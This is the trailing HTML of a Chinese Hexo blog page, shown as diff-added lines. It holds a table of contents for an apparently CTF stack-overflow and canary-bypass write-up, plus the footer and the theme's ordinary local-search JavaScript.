+          分析过程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87read%E5%87%BD%E6%95%B0%E6%B3%84%E9%9C%B2%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">
+          通过read函数泄露信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AA%E9%99%90%E5%88%B6numbers%E5%A4%A7%E5%B0%8F%E5%AF%BC%E8%87%B4%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">1.2.</span> <span class="toc-text">
+          未限制numbers大小导致栈溢出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87scanf%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87canary"><span class="toc-number">1.3.</span> <span class="toc-text">
+          通过scanf函数绕过canary</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EXP"><span class="toc-number">2.</span> <span class="toc-text">
+          EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0"><span class="toc-number">2.1.</span> <span class="toc-text">
+          本地</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B"><span class="toc-number">2.2.</span> <span class="toc-text">
+          远程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">
+          参考</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/uploads/zhishi1.jpg" alt="avatar"></div></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/blingblingxuanxuan" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://weibo.com/anxinbuzitreexy" target="_blank" rel="noopener" data-popover="微博" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-weibo"></i></span></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>blingbling</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">访问人数</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">浏览总量</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>Just follow your heart, and keep smiling.</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', '请输入字符');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>
